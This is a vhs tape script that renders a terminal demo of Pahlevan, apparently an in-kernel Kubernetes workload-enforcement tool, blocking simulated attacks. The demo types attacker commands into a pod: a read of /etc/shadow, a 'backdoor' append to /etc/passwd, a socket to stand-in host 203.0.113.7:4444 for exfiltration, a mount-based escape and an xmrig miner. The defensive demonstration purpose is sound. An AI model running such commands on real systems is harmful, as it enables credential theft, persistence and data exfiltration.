# demo.tape - charmbracelet/vhs script for Pahlevan's intro demo.
# Render with:  vhs docs/assets/demo.tape   (produces docs/assets/demo.gif)
#
# It replays a real learn->enforce run: a static file server observed for 50
# minutes under continuous traffic on Linux 6.8.0 with the BPF LSM, then
# attacked. The numbers come from that run and from the VM suite; the helper
# shims live in docs/assets/demo.sh, which cites its sources line by line.
# docs/live-scenario.md describes the run, and docs/scenario-report.md is the
# report the harness wrote.

Output docs/assets/demo.gif

Set Shell "bash"
Set FontSize 20
Set Width 1200
Set Height 800
Set Padding 24
Set Margin 12
Set BorderRadius 10
Set Theme "Catppuccin Mocha"
Set TypingSpeed 40ms
Set PlaybackSpeed 1.0

# --- setup (hidden): load the scripted shims ---------------------------------
Hide
Type "source docs/assets/demo.sh; clear" Enter
Show

# --- title -------------------------------------------------------------------
Type "#  Pahlevan - it learns what your workload does, then denies the rest in-kernel"
Sleep 1100ms
Enter
Sleep 500ms

# --- 1) apply an adaptive policy: no rules to write --------------------------
Type "kubectl apply -f app-policy.yaml"
Sleep 350ms
Enter
Sleep 1100ms

# --- 2) learning window: files, execs, egress, capabilities ------------------
Type "pahlevan status --watch"
Sleep 350ms
Enter
Sleep 3600ms
Sleep 900ms

# --- 3) the workload's normal behaviour keeps working ------------------------
Type "allow_probe"
Sleep 350ms
Enter
Sleep 2200ms

# --- 4) attacker lands in the pod --------------------------------------------
Type "#  a command-injection bug lands an attacker inside the pod..."
Enter
Sleep 700ms

# 4a) credentials: a file the workload never opened
Type 'kubectl exec -it app-7c9b4 -- python3 -c "open(/etc/shadow).read()"'
Sleep 350ms
Enter
Sleep 2200ms

# 4b) persistence: the write path specifically, on a file whose READ was learned
Type 'kubectl exec -it app-7c9b4 -- sh -c "echo backdoor >> /etc/passwd"'
Sleep 350ms
Enter
Sleep 2600ms

# 4c) exfiltration: through the interpreter that IS learned
Type 'kubectl exec -it app-7c9b4 -- python3 -c "socket.create_connection((203.0.113.7,4444))"'
Sleep 350ms
Enter
Sleep 2400ms

# 4d) escape: needs a capability the workload never used
Type 'kubectl exec -it app-7c9b4 -- python3 -c "libc.mount(proc,/mnt,proc,0,None)"'
Sleep 350ms
Enter
Sleep 2200ms

# 4e) a dropped miner, renamed to look ordinary
Type "kubectl exec -it app-7c9b4 -- /tmp/xmrig"
Sleep 350ms
Enter
Sleep 2400ms

# 4f) the case the allow-set alone cannot catch: a LEARNED binary, wrong parent
Type "#  and the one an allow-set alone can't catch: a learned binary, wrong parent"
Enter
Sleep 700ms
Type "kubectl exec -it app-7c9b4 -- sh -c /usr/bin/psql"
Sleep 350ms
Enter
Sleep 2800ms

# --- 5) every denial is a real event you can ship somewhere ------------------
Type "pahlevan events --denials-only"
Sleep 350ms
Enter
Sleep 3400ms

# --- 6) the payoff -----------------------------------------------------------
Type "pahlevan attack-surface report"
Sleep 350ms
Enter
Sleep 2600ms

Type "#  No hand-written rules. Denied in-kernel by LSM BPF, before the syscall returns."
Sleep 800ms
Enter
Sleep 2800ms
